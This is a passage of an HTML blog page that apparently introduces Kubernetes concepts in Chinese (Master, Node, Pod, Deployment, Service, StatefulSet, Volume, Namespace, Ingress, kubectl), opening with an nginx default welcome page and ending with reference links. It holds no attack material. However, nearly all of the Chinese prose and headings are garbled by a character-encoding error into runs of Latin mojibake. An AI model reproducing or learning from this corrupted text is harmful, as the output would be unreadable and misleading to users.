class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html &#123; color-scheme: light dark; &#125;</span><br><span class="line">body &#123; width: 35em; margin: 0 auto;</span><br><span class="line">font-family: Tahoma, Verdana, Arial, sans-serif; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=<span class="string">&quot;http://nginx.org/&quot;</span>&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=<span class="string">&quot;http://nginx.com/&quot;</span>&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you <span class="keyword">for</span> using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="å…³é”®æŠ€æœ¯"><a href="#å…³é”®æŠ€æœ¯" class="headerlink" title="å…³é”®æŠ€æœ¯"></a>å…³é”®æŠ€æœ¯</h2><h4 id="èŠ‚ç‚¹-Master"><a href="#èŠ‚ç‚¹-Master" class="headerlink" title="èŠ‚ç‚¹ (Master)"></a>èŠ‚ç‚¹ (Master)</h4><p>Masterç»„ä»¶æä¾›é›†ç¾¤çš„ç®¡ç†æ§åˆ¶ä¸­å¿ƒã€‚</p><p>Master ç»„ä»¶å¯ä»¥åœ¨é›†ç¾¤ä¸­ä»»ä½•èŠ‚ç‚¹ä¸Šè¿è¡Œã€‚ä½†æ˜¯ä¸ºäº†ç®€å•èµ·è§ï¼Œé€šå¸¸åœ¨ä¸€å° VM&#x2F;æœºå™¨ä¸Šå¯åŠ¨æ‰€æœ‰ Master ç»„ä»¶ï¼Œå¹¶ä¸”ä¸ä¼šåœ¨æ­¤ VM&#x2F;æœºå™¨ä¸Šè¿è¡Œç”¨æˆ·å®¹å™¨ã€‚æ¯ä¸ª ks8 é›†ç¾¤ä¸­æœ‰ä¸€ä¸ª master èŠ‚ç‚¹è´Ÿè½½æ•´ä¸ªé›†ç¾¤çš„ç®¡ç†å’Œå’Œæ§åˆ¶ï¼ŒåŸºæœ¬ ks8 çš„æ‰€æœ‰æ§åˆ¶å‘½ä»¤éƒ½å‘ç»™å®ƒï¼Œå®ƒè´Ÿè´£å…·ä½“æ‰§è¡Œè¿‡ç¨‹ï¼Œæˆ‘ä»¬å‘½ä»¤éƒ½æ˜¯åœ¨ master èŠ‚ç‚¹ä¸Šè¿è¡Œçš„ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315003738344.png" alt="image-20240315003738344" style="zoom: 25%;" /><h4 id="èŠ‚ç‚¹-Node"><a href="#èŠ‚ç‚¹-Node" class="headerlink" title="èŠ‚ç‚¹ (Node)"></a>èŠ‚ç‚¹ (Node)</h4><p>èŠ‚ç‚¹ç»„ä»¶è¿è¡Œåœ¨ Nodeï¼Œä¸€ä¸ª Node å¯ä»¥æ˜¯ VM æˆ–ç‰©ç†æœºã€‚æä¾› Kubernetes è¿è¡Œæ—¶ç¯å¢ƒï¼Œä»¥åŠç»´æŠ¤ Podã€‚</p><p>æ¯ä¸ª Nodeï¼ˆèŠ‚ç‚¹ï¼‰å…·æœ‰è¿è¡Œ pod çš„ä¸€äº›å¿…è¦æœåŠ¡ï¼Œå¹¶ç”± Master ç»„ä»¶è¿›è¡Œç®¡ç†ï¼ŒNode èŠ‚ç‚¹ä¸Šçš„æœåŠ¡åŒ…æ‹¬ Dockerã€kubelet å’Œ kube-proxyã€‚node èŠ‚ç‚¹æ˜¯ k8s é›†ç¾¤ä¸­ä¸­å·¥ä½œè´Ÿè½½èŠ‚ç‚¹ï¼Œæ¯ä¸ª node èŠ‚ç‚¹éƒ½ä¼šè¢« Master èŠ‚ç‚¹åˆ†é…å·¥ä½œè´Ÿè½½ã€‚å½“æŸä¸ª node å®•æœºæ˜¯ï¼Œå…¶ä¸Šå·¥ä½œè¢« Master åˆ†é…åˆ°å…¶ä»–èŠ‚ç‚¹ä¸Šå»ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240315003844290.png" alt="image-20240315003844290" style="zoom:25%;" /><h4 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h4><p>Pod æ˜¯ Kubernetes åˆ›å»ºæˆ–éƒ¨ç½²çš„æœ€å°&#x2F;æœ€ç®€å•çš„åŸºæœ¬å•ä½ï¼Œä¸€ä¸ª Pod ä»£è¡¨é›†ç¾¤ä¸Šæ­£åœ¨è¿è¡Œçš„ä¸€ä¸ªè¿›ç¨‹ã€‚</p><p>å…¶è®¾è®¡ç†å¿µæ˜¯æ”¯æŒå¤šä¸ªå®¹å™¨åœ¨ä¸€ä¸ª Pod ä¸­å…±äº«ç½‘ç»œåœ°å€å’Œæ–‡ä»¶ç³»ç»Ÿï¼Œå¯ä»¥é€šè¿‡è¿›ç¨‹é—´é€šä¿¡å’Œæ–‡ä»¶å…±äº«è¿™ç§ç®€å•é«˜æ•ˆçš„æ–¹å¼ç»„åˆå®ŒæˆæœåŠ¡ã€‚</p><p>ä¸€ä¸ª Pod å°è£…ä¸€ä¸ªåº”ç”¨å®¹å™¨ï¼ˆä¹Ÿå¯ä»¥æœ‰å¤šä¸ªå®¹å™¨ï¼‰ï¼Œå­˜å‚¨èµ„æºã€ä¸€ä¸ªç‹¬ç«‹çš„ç½‘ç»œ IP ä»¥åŠç®¡ç†æ§åˆ¶å®¹å™¨è¿è¡Œæ–¹å¼çš„ç­–ç•¥é€‰é¡¹ã€‚Pod ä»£è¡¨éƒ¨ç½²çš„ä¸€ä¸ªå•ä½ï¼šKubernetes ä¸­å•ä¸ªåº”ç”¨çš„å®ä¾‹ï¼Œå®ƒå¯èƒ½ç”±å•ä¸ªå®¹å™¨æˆ–å¤šä¸ªå®¹å™¨å…±äº«ç»„æˆçš„èµ„æºã€‚</p><blockquote><p>Docker æ˜¯ Kubernetes Pod ä¸­æœ€å¸¸è§çš„ runtimeÂ ï¼ŒPods ä¹Ÿæ”¯æŒå…¶ä»–å®¹å™¨ runtimesã€‚</p></blockquote><p>Podæ˜¯K8sé›†ç¾¤ä¸­æ‰€æœ‰ä¸šåŠ¡ç±»å‹çš„åŸºç¡€ã€‚ç›®å‰ K8s ä¸­çš„ä¸šåŠ¡ä¸»è¦å¯ä»¥åˆ†ä¸ºé•¿æœŸä¼ºæœå‹ï¼ˆlong-runningï¼‰ã€æ‰¹å¤„ç†å‹ï¼ˆbatchï¼‰ã€èŠ‚ç‚¹åå°æ”¯æ’‘å‹ï¼ˆnode-daemonï¼‰å’Œæœ‰çŠ¶æ€åº”ç”¨å‹ï¼ˆstateful applicationï¼‰ï¼›åˆ†åˆ«å¯¹åº”çš„podæ§åˆ¶å™¨ä¸ºDeploymentã€Jobã€DaemonSetå’ŒPetSetã€‚</p><ul><li>Kubernetesä¸­çš„Podä½¿ç”¨å¯åˆ†ä¸¤ç§ä¸»è¦æ–¹å¼ï¼š<ul><li>Podä¸­è¿è¡Œä¸€ä¸ªå®¹å™¨ã€‚â€œone-container-per-Podâ€æ¨¡å¼æ˜¯Kubernetesæœ€å¸¸è§çš„ç”¨æ³•;Â åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥å°†Podè§†ä¸ºå•ä¸ªå°è£…çš„å®¹å™¨ï¼Œä½†æ˜¯Kubernetesæ˜¯ç›´æ¥ç®¡ç†Podè€Œä¸æ˜¯å®¹å™¨ã€‚</li><li>Podsä¸­è¿è¡Œå¤šä¸ªéœ€è¦ä¸€èµ·å·¥ä½œçš„å®¹å™¨ã€‚Podå¯ä»¥å°è£…ç´§å¯†è€¦åˆçš„åº”ç”¨ï¼Œå®ƒä»¬éœ€è¦ç”±å¤šä¸ªå®¹å™¨ç»„æˆï¼Œå®ƒä»¬ä¹‹é—´èƒ½å¤Ÿå…±äº«èµ„æºï¼Œè¿™äº›å®¹å™¨å¯ä»¥å½¢æˆä¸€ä¸ªå•ä¸€çš„å†…éƒ¨serviceå•ä½ - ä¸€ä¸ªå®¹å™¨å…±äº«æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªâ€œsidecarâ€å®¹å™¨æ¥æ›´æ–°è¿™äº›æ–‡ä»¶ã€‚Podå°†è¿™äº›å®¹å™¨çš„å­˜å‚¨èµ„æºä½œä¸ºä¸€ä¸ªå®ä½“æ¥ç®¡ç†ã€‚</li></ul></li><li>Podsæä¾›ä¸¤ç§å…±äº«èµ„æºï¼šç½‘ç»œå’Œå­˜å‚¨ã€‚<ul><li>ç½‘ç»œï¼šæ¯ä¸ªPodè¢«åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„IPåœ°å€ï¼ŒPodä¸­çš„æ¯ä¸ªå®¹å™¨å…±äº«ç½‘ç»œå‘½åç©ºé—´ï¼ŒåŒ…æ‹¬IPåœ°å€å’Œç½‘ç»œç«¯å£ã€‚Podå†…çš„å®¹å™¨å¯ä»¥ä½¿ç”¨localhostç›¸äº’é€šä¿¡ã€‚å½“Podä¸­çš„å®¹å™¨ä¸PodÂ å¤–éƒ¨é€šä¿¡æ—¶ï¼Œä»–ä»¬å¿…é¡»åè°ƒå¦‚ä½•ä½¿ç”¨å…±äº«ç½‘ç»œèµ„æºï¼ˆå¦‚ç«¯å£ï¼‰ã€‚</li><li>å­˜å‚¨ï¼šPodå¯ä»¥æŒ‡å®šä¸€ç»„å…±äº«å­˜å‚¨<em>volumes</em>ã€‚Podä¸­çš„æ‰€æœ‰å®¹å™¨éƒ½å¯ä»¥è®¿é—®å…±äº«<em>volumes</em>ï¼Œå…è®¸è¿™äº›å®¹å™¨å…±äº«æ•°æ®ã€‚<em>volumes</em>Â è¿˜ç”¨äºPodä¸­çš„æ•°æ®æŒä¹…åŒ–ï¼Œä»¥é˜²å…¶ä¸­ä¸€ä¸ªå®¹å™¨éœ€è¦é‡æ–°å¯åŠ¨è€Œä¸¢å¤±æ•°æ®ã€‚æœ‰å…³Kuberneteså¦‚ä½•åœ¨Podä¸­å®ç°å…±äº«å­˜å‚¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒVolumesã€‚</li></ul></li></ul><h4 id="éƒ¨ç½²-Deployment"><a href="#éƒ¨ç½²-Deployment" class="headerlink" title="éƒ¨ç½² (Deployment)"></a>éƒ¨ç½² (Deployment)</h4><p>Deploymentè¡¨ç¤ºç”¨æˆ·å¯¹K8sé›†ç¾¤çš„ä¸€æ¬¡æ›´æ–°æ“ä½œã€‚Deploymentæ˜¯ä¸€ä¸ªæ¯”RSåº”ç”¨æ¨¡å¼æ›´å¹¿çš„APIå¯¹è±¡ï¼Œå¯ä»¥æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„æœåŠ¡ï¼Œæ›´æ–°ä¸€ä¸ªæ–°çš„æœåŠ¡ï¼Œä¹Ÿå¯ä»¥æ˜¯æ»šåŠ¨å‡çº§ä¸€ä¸ªæœåŠ¡ã€‚</p><p>åªéœ€è¦åœ¨ Deployment ä¸­æè¿°æ‚¨æƒ³è¦çš„ç›®æ ‡çŠ¶æ€æ˜¯ä»€ä¹ˆï¼ŒDeployment controller å°±ä¼šå°† Pod å’ŒReplicaSet çš„å®é™…çŠ¶æ€æ”¹å˜åˆ°æ‚¨çš„ç›®æ ‡çŠ¶æ€ã€‚å¯ä»¥å®šä¹‰ä¸€ä¸ªå…¨æ–°çš„ Deployment æ¥åˆ›å»º ReplicaSet æˆ–è€…åˆ é™¤å·²æœ‰çš„ Deployment å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„æ¥æ›¿æ¢ã€‚</p><h4 id="æœåŠ¡-Service"><a href="#æœåŠ¡-Service" class="headerlink" title="æœåŠ¡ (Service)"></a>æœåŠ¡ (Service)</h4><blockquote><p>KubernetesÂ PodÂ æ˜¯æœ‰ç”Ÿå‘½å‘¨æœŸçš„ï¼Œå®ƒä»¬å¯ä»¥è¢«åˆ›å»ºï¼Œä¹Ÿå¯ä»¥è¢«é”€æ¯ï¼Œç„¶è€Œä¸€æ—¦è¢«é”€æ¯ç”Ÿå‘½å°±æ°¸è¿œç»“æŸã€‚ é€šè¿‡Â ReplicationControllerÂ èƒ½å¤ŸåŠ¨æ€åœ°åˆ›å»ºå’Œé”€æ¯Â Podï¼ˆä¾‹å¦‚ï¼Œéœ€è¦è¿›è¡Œæ‰©ç¼©å®¹ï¼Œæˆ–è€…æ‰§è¡ŒÂ æ»šåŠ¨å‡çº§ï¼‰ã€‚æ¯ä¸ªÂ PodÂ éƒ½ä¼šè·å–å®ƒè‡ªå·±çš„ IP åœ°å€ï¼Œå³ä½¿è¿™äº› IP åœ°å€ä¸æ€»æ˜¯ç¨³å®šå¯ä¾èµ–çš„ã€‚ è¿™ä¼šå¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼šåœ¨ Kubernetes é›†ç¾¤ä¸­ï¼Œå¦‚æœä¸€ç»„Â Podï¼ˆç§°ä¸º backendï¼‰ä¸ºå…¶å®ƒÂ PodÂ ï¼ˆç§°ä¸º frontendï¼‰æä¾›æœåŠ¡ï¼Œé‚£ä¹ˆé‚£äº› frontend è¯¥å¦‚ä½•å‘ç°ï¼Œå¹¶è¿æ¥åˆ°è¿™ç»„Â PodÂ ä¸­çš„å“ªäº› backend å‘¢ï¼Ÿ</p></blockquote><p>KubernetesÂ ServiceÂ å®šä¹‰äº†è¿™æ ·ä¸€ç§æŠ½è±¡ï¼šä¸€ä¸ªÂ PodÂ çš„é€»è¾‘åˆ†ç»„ï¼Œä¸€ç§å¯ä»¥è®¿é—®å®ƒä»¬çš„<strong>ç­–ç•¥</strong> â€”â€” é€šå¸¸ç§°ä¸ºå¾®æœåŠ¡ã€‚ è¿™ä¸€ç»„Â PodÂ èƒ½å¤Ÿè¢«Â ServiceÂ è®¿é—®åˆ°ï¼Œé€šå¸¸æ˜¯é€šè¿‡Â Label Selectorå®ç°çš„ã€‚</p><p>æ¯ä¸ªServiceä¼šå¯¹åº”ä¸€ä¸ªé›†ç¾¤å†…éƒ¨æœ‰æ•ˆçš„è™šæ‹ŸIPï¼Œé›†ç¾¤å†…éƒ¨é€šè¿‡è™šæ‹ŸIPè®¿é—®ä¸€ä¸ªæœåŠ¡ã€‚</p><p>Kubernetes æ”¯æŒ2ç§åŸºæœ¬çš„æœåŠ¡å‘ç°æ¨¡å¼ â€”â€” ç¯å¢ƒå˜é‡å’Œ DNSã€‚</p><ul><li>å½“Â PodÂ è¿è¡Œåœ¨Â NodeÂ ä¸Šï¼Œkubelet ä¼šä¸ºæ¯ä¸ªæ´»è·ƒçš„Â ServiceÂ æ·»åŠ ä¸€ç»„ç¯å¢ƒå˜é‡ã€‚ å®ƒåŒæ—¶æ”¯æŒÂ Docker linkså…¼å®¹Â å˜é‡ã€ç®€å•çš„Â {SVCNAME}_SERVICE_HOSTÂ å’ŒÂ {SVCNAME}_SERVICE_PORTÂ å˜é‡</li><li>ä¸€ä¸ªå¯é€‰ï¼ˆå°½ç®¡å¼ºçƒˆæ¨èï¼‰é›†ç¾¤æ’ä»¶Â æ˜¯DNS æœåŠ¡å™¨ã€‚ DNS æœåŠ¡å™¨ç›‘è§†ç€åˆ›å»ºæ–°Â ServiceÂ çš„ Kubernetes APIï¼Œä»è€Œä¸ºæ¯ä¸€ä¸ªÂ ServiceÂ åˆ›å»ºä¸€ç»„ DNSè®°å½•ã€‚ å¦‚æœæ•´ä¸ªé›†ç¾¤çš„ DNS ä¸€ç›´è¢«å¯ç”¨ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„Â PodÂ åº”è¯¥èƒ½å¤Ÿè‡ªåŠ¨å¯¹Â ServiceÂ è¿›è¡Œåç§°è§£æã€‚</li></ul><h4 id="Replica-Sets-å’Œ-Replication-Controller"><a href="#Replica-Sets-å’Œ-Replication-Controller" class="headerlink" title="Replica Sets å’Œ Replication Controller"></a><strong>Replica Sets å’Œ Replication Controller</strong></h4><blockquote><p>ReplicaSetï¼ˆRSï¼‰æ˜¯Replication Controllerï¼ˆRCï¼‰çš„å‡çº§ç‰ˆæœ¬ã€‚ReplicaSet å’Œ Â Replication Controllerä¹‹é—´çš„å”¯ä¸€åŒºåˆ«æ˜¯å¯¹é€‰æ‹©å™¨çš„æ”¯æŒã€‚ReplicaSetæ”¯æŒ labels user guide ä¸­æè¿°çš„set-basedé€‰æ‹©å™¨è¦æ±‚ï¼ŒÂ è€ŒReplication Controllerä»…æ”¯æŒequality-basedçš„é€‰æ‹©å™¨è¦æ±‚ã€‚</p></blockquote><p>ReplicaSet èƒ½ç¡®ä¿è¿è¡ŒæŒ‡å®šæ•°é‡çš„ podã€‚ç„¶è€Œï¼ŒDeployment æ˜¯ä¸€ä¸ªæ›´é«˜å±‚æ¬¡çš„æ¦‚å¿µï¼Œå®ƒèƒ½ç®¡ç† ReplicaSetsï¼Œå¹¶æä¾›å¯¹ pod çš„æ›´æ–°ç­‰åŠŸèƒ½ã€‚å› æ­¤ï¼Œå»ºè®®ä½¿ç”¨ Deployment æ¥ç®¡ç† ReplicaSetsã€‚</p><p>RCå’ŒRSä¸»è¦æ˜¯æ§åˆ¶æä¾›æ— çŠ¶æ€æœåŠ¡çš„ï¼Œå…¶æ‰€æ§åˆ¶çš„Podçš„åå­—æ˜¯éšæœºè®¾ç½®çš„ï¼Œä¸€ä¸ªPodå‡ºæ•…éšœäº†å°±è¢«ä¸¢å¼ƒæ‰ï¼Œåœ¨å¦ä¸€ä¸ªåœ°æ–¹é‡å¯ä¸€ä¸ªæ–°çš„Podï¼Œåå­—å˜äº†ã€åå­—å’Œå¯åŠ¨åœ¨å“ªå„¿éƒ½ä¸é‡è¦ï¼Œé‡è¦çš„åªæ˜¯Podæ€»æ•°ï¼›è€ŒPetSetæ˜¯ç”¨æ¥æ§åˆ¶æœ‰çŠ¶æ€æœåŠ¡ï¼ŒPetSetä¸­çš„æ¯ä¸ªPodçš„åå­—éƒ½æ˜¯äº‹å…ˆç¡®å®šçš„ï¼Œä¸èƒ½æ›´æ”¹ã€‚PetSetä¸­Podçš„åå­—çš„ä½œç”¨æ˜¯å…³è”ä¸è¯¥Podå¯¹åº”çš„çŠ¶æ€ã€‚</p><h4 id="æœ‰çŠ¶æ€æœåŠ¡é›†-StatefulSets"><a href="#æœ‰çŠ¶æ€æœåŠ¡é›†-StatefulSets" class="headerlink" title="æœ‰çŠ¶æ€æœåŠ¡é›† (StatefulSets)"></a><strong>æœ‰çŠ¶æ€æœåŠ¡é›† (StatefulSets)</strong></h4><p>StatefulSetsï¼ˆæœ‰çŠ¶æ€ç³»ç»ŸæœåŠ¡è®¾è®¡ï¼‰åœ¨Kubernetes 1.7ä¸­è¿˜æ˜¯betaç‰¹æ€§ï¼ŒåŒæ—¶StatefulSetsæ˜¯1.4 ç‰ˆæœ¬ä¸­PetSetsçš„æ›¿ä»£å“ã€‚</p><p>åœ¨å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹æ—¶ä½¿ç”¨StatefulSetsï¼š</p><ul><li>ç¨³å®šæ€§ï¼Œå”¯ä¸€çš„ç½‘ç»œæ ‡è¯†ç¬¦ã€‚</li><li>ç¨³å®šæ€§ï¼ŒæŒä¹…åŒ–å­˜å‚¨ã€‚</li><li>æœ‰åºçš„éƒ¨ç½²å’Œæ‰©å±•ã€‚</li><li>æœ‰åºçš„åˆ é™¤å’Œç»ˆæ­¢ã€‚</li><li>æœ‰åºçš„è‡ªåŠ¨æ»šåŠ¨æ›´æ–°ã€‚</li></ul><p>Podè°ƒåº¦è¿è¡Œæ—¶ï¼Œå¦‚æœåº”ç”¨ä¸éœ€è¦ä»»ä½•ç¨³å®šçš„æ ‡ç¤ºã€æœ‰åºçš„éƒ¨ç½²ã€åˆ é™¤å’Œæ‰©å±•ï¼Œåˆ™åº”è¯¥ä½¿ç”¨ä¸€ç»„æ— çŠ¶æ€å‰¯æœ¬çš„æ§åˆ¶å™¨æ¥éƒ¨ç½²åº”ç”¨ï¼Œä¾‹å¦‚Â DeploymentÂ æˆ–Â ReplicaSetæ›´é€‚åˆæ— çŠ¶æ€æœåŠ¡éœ€æ±‚ã€‚</p><h4 id="å­˜å‚¨å·-Volume"><a href="#å­˜å‚¨å·-Volume" class="headerlink" title="å­˜å‚¨å· (Volume)"></a>å­˜å‚¨å· (Volume)</h4><blockquote><p>é»˜è®¤æƒ…å†µä¸‹å®¹å™¨ä¸­çš„ç£ç›˜æ–‡ä»¶æ˜¯éæŒä¹…åŒ–çš„ï¼Œå¯¹äºè¿è¡Œåœ¨å®¹å™¨ä¸­çš„åº”ç”¨æ¥è¯´é¢ä¸´ä¸¤ä¸ªé—®é¢˜ï¼š</p><p>ç¬¬ä¸€ï¼šå½“å®¹å™¨æŒ‚æ‰kubeletå°†é‡å¯å¯åŠ¨å®ƒæ—¶ï¼Œæ–‡ä»¶å°†ä¼šä¸¢å¤±ï¼›</p><p>ç¬¬äºŒï¼šå½“Podä¸­åŒæ—¶è¿è¡Œå¤šä¸ªå®¹å™¨ï¼Œå®¹å™¨ä¹‹é—´éœ€è¦å…±äº«æ–‡ä»¶æ—¶ã€‚</p></blockquote><p>Kubernetesçš„Volumeè§£å†³äº†è¿™ä¸¤ä¸ªé—®é¢˜ã€‚</p><p>åœ¨Dockerä¸­ä¹Ÿæœ‰ä¸€ä¸ªdocker Volume çš„æ¦‚å¿µ ï¼ŒDocker çš„ Volume åªæ˜¯ç£ç›˜ä¸­çš„ä¸€ä¸ªç›®å½•ï¼Œç”Ÿå‘½å‘¨æœŸä¸å—ç®¡ç†ã€‚å½“ç„¶ Docker ç°åœ¨ä¹Ÿæä¾› Volume å°†æ•°æ®æŒä¹…åŒ–å­˜å‚¨ï¼Œä½†æ”¯æŒåŠŸèƒ½æ¯”è¾ƒå°‘ã€‚</p><p>Kubernetes Volumeå…·æœ‰æ˜ç¡®çš„ç”Ÿå‘½å‘¨æœŸ - ä¸podç›¸åŒã€‚å› æ­¤ï¼ŒVolumeçš„ç”Ÿå‘½å‘¨æœŸæ¯”Podä¸­è¿è¡Œçš„ä»»ä½•å®¹å™¨è¦æŒä¹…ï¼Œåœ¨å®¹å™¨é‡æ–°å¯åŠ¨æ—¶èƒ½å¯ä»¥ä¿ç•™æ•°æ®ï¼Œå½“ç„¶ï¼Œå½“Podè¢«åˆ é™¤ä¸å­˜åœ¨æ—¶ï¼ŒVolumeä¹Ÿå°†æ¶ˆå¤±ã€‚æ³¨æ„ï¼ŒKubernetesæ”¯æŒè®¸å¤šç±»å‹çš„Volumeï¼ŒPodå¯ä»¥åŒæ—¶ä½¿ç”¨ä»»æ„ç±»å‹&#x2F;æ•°é‡çš„Volumeã€‚</p><p>å†…éƒ¨å®ç°ä¸­ï¼Œä¸€ä¸ªVolumeåªæ˜¯ä¸€ä¸ªç›®å½•ï¼Œç›®å½•ä¸­å¯èƒ½æœ‰ä¸€äº›æ•°æ®ï¼Œpodçš„å®¹å™¨å¯ä»¥è®¿é—®è¿™äº›æ•°æ®ã€‚è‡³äºè¿™ä¸ªç›®å½•æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€æ”¯æŒå®ƒçš„ä»‹è´¨ã€å…¶ä¸­çš„æ•°æ®å†…å®¹æ˜¯ä»€ä¹ˆï¼Œè¿™äº›éƒ½ç”±ä½¿ç”¨çš„ç‰¹å®šVolumeç±»å‹æ¥å†³å®šã€‚</p><h4 id="å‘½åç©ºé—´-Namespace"><a href="#å‘½åç©ºé—´-Namespace" class="headerlink" title="å‘½åç©ºé—´ (Namespace)"></a>å‘½åç©ºé—´ (Namespace)</h4><p>å½“å›¢é˜Ÿæˆ–é¡¹ç›®ä¸­å…·æœ‰è®¸å¤šç”¨æˆ·æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨Namespaceæ¥åŒºåˆ†ï¼Œaå¦‚æœæ˜¯å°‘é‡ç”¨æˆ·é›†ç¾¤ï¼Œå¯ä»¥ä¸éœ€è¦è€ƒè™‘ä½¿ç”¨Namespaceï¼Œå¦‚æœéœ€è¦å®ƒä»¬æä¾›ç‰¹æ®Šæ€§è´¨æ—¶ï¼Œå¯ä»¥å¼€å§‹ä½¿ç”¨Namespaceã€‚Namespaceä¸ºåç§°æä¾›äº†ä¸€ä¸ªèŒƒå›´ã€‚èµ„æºçš„Namesåœ¨Namespaceä¸­å…·æœ‰å”¯ä¸€æ€§ã€‚</p><p>Namespace æ˜¯ä¸€ç§å°†é›†ç¾¤èµ„æºåˆ’åˆ†ä¸ºå¤šä¸ªç”¨é€”çš„æ–¹æ³•ã€‚</p><p>K8sé›†ç¾¤åˆå§‹æœ‰ä¸¤ä¸ª Namespace ï¼Œåˆ†åˆ«æ˜¯é»˜è®¤ Namespace defaultå’Œç³»ç»Ÿ Namespace kube-system</p><h4 id="å…¥å£-Ingress"><a href="#å…¥å£-Ingress" class="headerlink" title="å…¥å£ (Ingress)"></a>å…¥å£ (Ingress)</h4><p>ä¸€ä¸ªAPIå¯¹è±¡ï¼Œç”¨äºç®¡ç†å¯¹ç¾¤é›†ä¸­æœåŠ¡çš„å¤–éƒ¨è®¿é—®ï¼Œé€šå¸¸ä¸ºHTTPã€‚Ingresså¯ä»¥æä¾›è´Ÿè½½å¹³è¡¡ï¼ŒSSLç»ˆæ­¢å’ŒåŸºäºåç§°çš„è™šæ‹Ÿä¸»æœºã€‚Ingresså°†HTTPå’ŒHTTPSè·¯ç”±ä»é›†ç¾¤å¤–éƒ¨æš´éœ²ç»™é›†ç¾¤å†…çš„æœåŠ¡ã€‚æµé‡è·¯ç”±ç”±Ingressèµ„æºä¸Šå®šä¹‰çš„è§„åˆ™æ§åˆ¶ã€‚</p><h4 id="APIå¯¹è±¡"><a href="#APIå¯¹è±¡" class="headerlink" title="APIå¯¹è±¡"></a><strong>APIå¯¹è±¡</strong></h4><p>æ¯ä¸ªAPIå¯¹è±¡éƒ½æœ‰3å¤§ç±»å±æ€§ï¼šå…ƒæ•°æ®metadataã€è§„èŒƒspecå’ŒçŠ¶æ€statusã€‚</p><p>å…ƒæ•°æ®metadataï¼šæ˜¯ç”¨æ¥æ ‡è¯†APIå¯¹è±¡çš„ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½è‡³å°‘æœ‰3ä¸ªå…ƒæ•°æ®ï¼šnamespaceï¼Œnameå’Œuidï¼›é™¤æ­¤ä»¥å¤–è¿˜æœ‰å„ç§å„æ ·çš„æ ‡ç­¾labelsç”¨æ¥æ ‡è¯†å’ŒåŒ¹é…ä¸åŒçš„å¯¹è±¡ã€‚</p><p>è§„èŒƒspecï¼šæè¿°äº†ç”¨æˆ·æœŸæœ›K8sé›†ç¾¤ä¸­çš„åˆ†å¸ƒå¼ç³»ç»Ÿè¾¾åˆ°çš„ç†æƒ³çŠ¶æ€ã€‚</p><p>çŠ¶æ€statusï¼šæè¿°äº†ç³»ç»Ÿå®é™…å½“å‰è¾¾åˆ°çš„çŠ¶æ€ã€‚</p><p>K8sä¸­æ‰€æœ‰çš„é…ç½®éƒ½æ˜¯é€šè¿‡APIå¯¹è±¡çš„specå»è®¾ç½®çš„ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·é€šè¿‡é…ç½®ç³»ç»Ÿçš„ç†æƒ³çŠ¶æ€æ¥æ”¹å˜ç³»ç»Ÿï¼Œè¿™æ˜¯k8sé‡è¦è®¾è®¡ç†å¿µä¹‹ä¸€ï¼Œå³æ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯å£°æ˜å¼ï¼ˆDeclarativeï¼‰çš„è€Œä¸æ˜¯å‘½ä»¤å¼ï¼ˆImperativeï¼‰çš„ã€‚</p><h4 id="kubectl-æ¦‚è¿°"><a href="#kubectl-æ¦‚è¿°" class="headerlink" title="kubectl æ¦‚è¿°"></a><strong>kubectl æ¦‚è¿°</strong></h4><p><strong>kubectl ç”¨äºè¿è¡Œ Kubernetes é›†ç¾¤å‘½ä»¤çš„ç®¡ç†å·¥å…·ã€‚</strong></p><p>ä½¿ç”¨ Kubernetes å‘½ä»¤è¡Œå·¥å…· kubectl åœ¨ Kubernetes ä¸Šéƒ¨ç½²å’Œç®¡ç†åº”ç”¨ç¨‹åºã€‚ä½¿ç”¨ kubectlï¼Œå¯ä»¥æ£€æŸ¥é›†ç¾¤èµ„æº; åˆ›å»ºï¼Œåˆ é™¤å’Œæ›´æ–°ç»„ä»¶ã€‚</p><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><p>ä¸­æ–‡æ–‡æ¡£ï¼š<a href="http://docs.kubernetes.org.cn/">http://docs.kubernetes.org.cn/</a></p><p>ä¸­æ–‡ç¤¾åŒºï¼š<a href="https://www.kubernetes.org.cn/k8s">https://www.kubernetes.org.cn/k8s</a></p><p>gitbookï¼š<a href="https://feisky.gitbooks.io/kubernetes/content/">https://feisky.gitbooks.io/kubernetes/content/</a></p><p>ç¼–è¯‘å®‰è£…ï¼š<a 